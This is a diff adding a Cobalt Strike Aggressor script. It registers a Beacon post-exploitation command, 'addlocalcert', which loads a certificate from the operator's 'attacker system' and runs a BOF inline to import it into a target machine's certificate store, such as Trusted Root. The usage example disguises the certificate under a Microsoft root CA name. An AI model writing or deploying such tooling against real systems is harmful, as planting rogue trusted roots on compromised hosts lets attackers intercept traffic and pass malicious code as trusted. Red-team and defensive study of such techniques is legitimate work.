@@ -1,0 +1,44 @@
+# author REDMED-X
+
+beacon_command_register(
+	"addlocalcert", "Add a self signed certificate to a specified local computer certificate store.",
+	"INFO:\nAdd a (self signed) certificate to a specified local computer certificate store. For example, add a certificate to the \"Trusted Root Certification Authorities\" (ROOT) folder on the local computer. All the properties are filled in based on the metadata in the certificate except the \"Friendly Name\" property. This property needs to be set manually as an argument.\n\n" .
+	"ARGUMENTS:\n[<path to certificate file>]: the path on your own attacker system to the certificate.cer file.\n[<store name>]: the certificate store name (like ROOT) to import the certificate into.\n[<friendly name>]: the name that is set in the \"Friendly Name\" property.\n\n" .
+	"USAGE:\naddlocalcert <path to certificate.cer file> <store name> \"<friendly name>\" \n\n" .
+	"EXAMPLES:\naddlocalcert C:\\Users\\operator\\Documents\\examplecert.cer ROOT \"Microsoft Root Certificate Authority 2010\"\n\n");
+	
+alias addlocalcert {
+    $bid = $1;
+	$path = $2;
+    $store = $3;
+	$name = $4;
+	
+	
+	if ($path eq "") {
+		berror($bid, "Please specify the path to the certicate.cer file on your own system.\n");
+		return;
+	}
+
+	if ($store eq "") {
+		berror($bid, "Please specify a valid local computer certificate store name like ROOT.\n");
+		return;
+	}
+	
+	# read in the certificate.cer file
+	$handle = openf("$path");
+	$certfile = readb($handle, -1);
+	closef($handle);
+	
+	blog($bid, "path: $+  $path");
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("addlocalcert.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	# Pack our arguments
+    $arg_data = bof_pack($bid, "bZz", $certfile, $store, $name);
+
+	blog($bid, "Tasked to add a certificate to a local computer store..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
